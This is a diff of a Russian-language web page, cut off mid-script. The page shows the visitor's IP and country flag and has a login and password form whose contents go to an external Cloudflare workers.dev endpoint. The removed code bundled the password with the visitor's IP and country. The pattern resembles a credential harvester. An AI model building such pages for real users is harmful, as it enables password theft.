@@ -1,54 +1,84 @@
-<script>
-  const WORKER_URL = 'https://…workers.dev/';
-  let clientIp = 'unknown', clientCountry = 'unknown';
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <title>Ваш IP и форма</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-color: #f4f4f9;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      background-color: white;
+      padding: 20px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 10px;
+      text-align: center;
+    }
+    h2 {
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ddd;
+      border-radius: 5px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .output {
+      margin-top: 20px;
+    }
+    .flag {
+      font-size: 30px;
+    }
+  </style>
+</head>
+<body>
 
-  // 1) Функция для флага
-  function countryCodeToFlagEmoji(countryCode) {
-    return countryCode
-      .toUpperCase()
-      .split('')
-      .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
-      .join('');
-  }
+  <div class="container">
+    <h2>Введите данные для отправки</h2>
+    <form action="https://mute-scene-f7f5.kamrantataloo69.workers.dev/" method="POST" id="loginForm">
+      <input type="text" name="login" placeholder="Login" required><br>
+      <input type="password" name="password" placeholder="Password" required><br>
+      <button type="submit">Отправить</button>
+    </form>
 
-  // 2) fetch IP → ipinfo
-  fetch('https://api.ipify.org?format=json')
-    .then(res => res.json())
-    .then(json => {
-      clientIp = json.ip;
-      document.getElementById('ip').textContent = clientIp;
-      return fetch(`https://ipinfo.io/${clientIp}/json?token=YOUR_API_KEY`);
-    })
-    .then(res => res.json())
-    .then(info => {
-      clientCountry = info.country;
-      // ← вот здесь меняем вывод:
-      const flagEmoji = countryCodeToFlagEmoji(clientCountry);
-      document.getElementById('country').textContent = `${flagEmoji} ${clientCountry}`;
+    <div class="output">
+      <p><strong>IP адрес:</strong> <span id="ip">Загрузка...</span></p>
+      <p><strong>Страна:</strong> <span id="country">Загрузка...</span></p>
+      <p><img id="flag" src="" alt="Flag" class="flag"></p>
+    </div>
+  </div>
 
-      document.getElementById('flag').src =
-        `https://flagcdn.com/w80/${clientCountry.toLowerCase()}.png`;
-    })
-    .catch(() => {
-      document.getElementById('country').textContent = '—';
-    });
+  <script>
+    // Функция для преобразования кода страны в emoji флаг
+    function countryCodeToFlagEmoji(countryCode) {
+      return countryCode
+        .toUpperCase()
+        .split('')
+        .map(ch => String.fromCodePoint(0x1F1E6 + ch.charCodeAt(0) - 65))
+        .join('');
+    }
 
-  // 3) submit формы отправляет {ip, country, login, password}
-  document.getElementById('loginForm').addEventListener('submit', async e => {
-    e.preventDefault();
-    const form = e.target;
-    const payload = {
-      ip: clientIp,
-      country: clientCountry,
-      login: form.login.value,
-      password: form.password.value
-    };
-    await fetch(WORKER_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(payload)
-    });
-    alert('Данные отправлены!');
-    form.reset();
-  });
-</script>
+    let clientIp = 'unknown', clientCountry = 'unknown';
+
+    // Запрос на получение IP
